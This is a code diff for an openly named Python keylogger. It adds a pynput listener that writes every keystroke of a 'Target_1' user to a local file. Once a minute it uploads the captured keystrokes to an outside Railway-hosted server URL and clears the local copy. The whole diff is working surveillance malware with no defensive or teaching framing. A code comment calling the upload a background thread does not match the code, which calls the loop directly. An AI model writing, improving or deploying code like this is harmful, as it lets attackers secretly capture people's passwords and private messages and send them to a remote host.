@@ -1,33 +1,61 @@
 import os
+import time
 import requests
+from pynput.keyboard import Key, Listener
 
-API_ENDPOINT = "https://keylogger-production-3a51.up.railway.app/logs"
-LOG_FILE = "Target_1.txt"
-MAX_SIZE = 10 * 1024 * 1024  # 10MB limit for local log file
+# Configuration
+TARGET_DIR = "Logs"  # Directory to store logs
+USER_NAME = "Target_1"  # Target name
+LOG_FILE = os.path.join(TARGET_DIR, f"{USER_NAME}.txt")
+API_URL = "https://keylogger-production-3a51.up.railway.app/logs"  # FastAPI server URL
+MAX_SIZE = 10 * 1024 * 1024  # 10MB file size limit
 
+# Ensure the Logs directory exists
+if not os.path.exists(TARGET_DIR):
+    os.makedirs(TARGET_DIR)
+
+# Function to log keystrokes
+def log_key(key):
+    try:
+        with open(LOG_FILE, "a") as f:
+            f.write(f"{str(key)}\n")
+    except Exception as e:
+        print(f"Error logging key: {e}")
+
+# Function to send logs to the server
 def send_logs():
-    if os.path.exists(LOG_FILE):
-        file_size = os.path.getsize(LOG_FILE)
-        if file_size > MAX_SIZE:
-            print(f"Log file size exceeds {MAX_SIZE / 1024 / 1024} MB. Cannot send.")
-            return
+    while True:
+        try:
+            # Check if the log file exists and isn't empty
+            if os.path.exists(LOG_FILE):
+                with open(LOG_FILE, "r") as f:
+                    logs = f.read()
 
-        # Open the file and send it to the server
-        with open(LOG_FILE, "rb") as f:
-            files = {'file': (LOG_FILE, f)}
-            try:
-                response = requests.post(API_ENDPOINT, files=files)
-                print(f"Server response: {response.status_code} - {response.text}")
-                if response.status_code == 200:
-                    # Delete the log file after successful upload
-                    os.remove(LOG_FILE)
-                    print(f"Deleted local log file: {LOG_FILE}")
-                else:
-                    print(f"Failed to upload logs: {response.status_code}")
-            except Exception as e:
-                print(f"Error sending logs: {e}")
-    else:
-        print("Log file not found. Nothing to send.")
+                if logs.strip():  # Only send non-empty logs
+                    response = requests.post(API_URL, json={"logs": logs, "user_name": USER_NAME})
 
-if __name__ == "__main__":
-    send_logs()
+                    if response.status_code == 200:
+                        print(f"Logs sent successfully to server.")
+                        # Clear the local log file after successful upload
+                        with open(LOG_FILE, "w") as f:
+                            f.truncate(0)  # Clear file content
+                    else:
+                        print(f"Failed to send logs: {response.status_code}, {response.text}")
+
+            time.sleep(60)  # Wait 60 seconds before retrying
+        except Exception as e:
+            print(f"Error sending logs: {e}")
+            time.sleep(60)  # Retry after delay
+
+# Listen for keypress events
+def on_press(key):
+    log_key(key)
+
+def on_release(key):
+    if key == Key.esc:
+        return False  # Stop the keylogger
+
+# Start the keylogger and log-sending process
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    send_logs_thread = send_logs()  # Run log sending in the background
+    listener.join()
